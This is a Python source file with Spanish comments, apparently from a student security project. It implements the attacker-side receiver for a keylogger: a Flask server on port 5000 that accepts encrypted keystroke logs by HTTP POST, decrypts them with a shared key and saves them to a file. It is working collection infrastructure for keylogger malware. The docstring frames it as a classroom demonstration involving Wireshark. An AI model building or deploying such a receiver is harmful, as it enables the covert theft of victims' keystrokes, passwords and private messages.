"""
receiver.py
Servidor receptor simple (lado del atacante).

Ejecutar en tu VM de atacante o máquina controlada:
    python src/receiver.py

Recibe datos cifrados vía HTTP POST y los descifra usando la misma clave.

Para el proyecto:
- Debes mostrar que recibes y descifras correctamente.
- En la demostración MITM usarás Wireshark para mostrar que el tráfico viaja cifrado.
"""

from flask import Flask, request, jsonify
from crypto_utils import decrypt, load_key
import os
import json
from datetime import datetime

app = Flask(__name__)

# Cargar la misma clave que usa el keylogger
# Copia el archivo secret.key a la máquina del receptor
try:
    KEY = load_key("secret.key")
except FileNotFoundError:
    print("[-] No se encontró secret.key. Copia la clave generada por el keylogger.")
    exit(1)

# Archivo donde guardaremos los logs descifrados
LOG_FILE = "received_logs.txt"


@app.route("/upload", methods=["POST"])
def upload():
    try:
        data = request.get_json()
        if not data or "payload" not in data:
            return jsonify({"error": "Payload faltante"}), 400

        encrypted = data["payload"]
        decrypted = decrypt(encrypted, KEY)

        timestamp = data.get("timestamp", datetime.utcnow().isoformat())

        log_entry = f"\n=== {timestamp} ===\n{decrypted.decode('utf-8', errors='replace')}\n"

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)

        print(log_entry)  # Mostrar en consola del atacante

        return jsonify({"status": "ok", "received": len(decrypted)}), 200

    except Exception as e:
        print(f"Error descifrando: {e}")
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    print("[*] Receptor iniciado en http://0.0.0.0:5000")
    print(f"[*] Los logs descifrados se guardan en {LOG_FILE}")
    app.run(host="0.0.0.0", port=5000, debug=False)
